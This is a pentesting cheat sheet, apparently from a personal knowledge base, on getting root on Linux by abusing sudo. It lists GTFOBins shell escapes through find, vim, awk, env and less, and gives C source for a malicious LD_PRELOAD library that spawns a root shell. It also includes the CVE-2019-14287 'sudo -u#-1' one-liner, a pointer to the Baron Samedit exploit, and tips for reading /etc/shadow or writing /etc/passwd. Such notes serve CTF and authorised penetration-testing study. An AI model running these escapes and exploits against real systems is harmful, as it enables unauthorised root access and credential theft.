# 🐧 Sudo Abuse

> `sudo -l` is the **#1 Linux privesc check**. Any binary you can run as root (especially `NOPASSWD`) usually has a **GTFOBins** escape to a root shell. Also covers `LD_PRELOAD`/`env_keep` and vulnerable sudo versions.

Part of [[Linux Privilege Escalation]]. Related: [[Credential Attacks]] · [[Shells]]

---

## 🧠 THINK
- **Run `sudo -l` first thing** — it needs a TTY ([[Shells]]) and sometimes the user's password.
- Any allowed binary → look it up on **GTFOBins** ("Sudo" section).
- `env_keep+=LD_PRELOAD` / `LD_LIBRARY_PATH` → library-injection to root.
- Old sudo version → known CVEs (Baron Samedit, `-u#-1`).

## ⚡ DETECT
```bash
sudo -l
```
```bash
sudo --version
```
**Look for:** `(ALL) NOPASSWD: /path/bin`, `(root) /path/bin`, `env_keep` entries, sudo < 1.9.5p2.

## 💥 EXPLOIT
**GTFOBins escape** — pattern for common binaries:
```bash
sudo find . -exec /bin/sh \; -quit
```
```bash
sudo vim -c ':!/bin/sh'
```
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```
```bash
sudo env /bin/sh
```
```bash
sudo less /etc/profile        # then :!/bin/sh
```
> For any allowed binary, check GTFOBins → copy its **Sudo** payload. If it only reads/writes files, use that to read `/etc/shadow` or write to `/etc/passwd`/a root cron.

**LD_PRELOAD (when `env_keep+=LD_PRELOAD` and you may run something as root):**
```c
// evil.c  ->  gcc -fPIC -shared -o evil.so evil.c -nostartfiles
#include <stdlib.h>
void _init(){ setuid(0); system("/bin/bash -p"); }
```
```bash
sudo LD_PRELOAD=/tmp/evil.so <allowed-binary>
```

**Vulnerable sudo versions:**
```bash
# CVE-2019-14287 (runas ALL, sudo < 1.8.28):
sudo -u#-1 /bin/bash
```
```bash
# CVE-2021-3156 Baron Samedit (heap overflow, sudo < 1.9.5p2): use a public PoC
searchsploit sudo baron samedit
```

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| `NOPASSWD` binary | GTFOBins Sudo escape → root |
| File-read/write binary only | read `/etc/shadow` or write root cron/`/etc/passwd` → [[Writable Files & PATH Hijack]] |
| `env_keep LD_PRELOAD` | build `evil.so` → `sudo LD_PRELOAD=` |
| sudo < 1.8.28 | `sudo -u#-1` |
| sudo < 1.9.5p2 | Baron Samedit PoC |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| `sudo -l` asks a password you don't have | find the user's password first ([[Linux Credential Hunting]]); try version CVEs (no password needed for some) |
| Binary not on GTFOBins | check if it calls sub-programs by relative path → [[Writable Files & PATH Hijack]] |
| "no tty present" | upgrade to a TTY ([[Shells]]) then retry |

## 📇 CHEAT SHEET
```bash
sudo -l ; sudo --version
```
```bash
sudo <gtfobin>          # e.g. sudo find . -exec /bin/sh \; -quit
```
```bash
sudo -u#-1 /bin/bash    # CVE-2019-14287
```
**Kill shot:** `sudo -l` → GTFOBins escape → root.
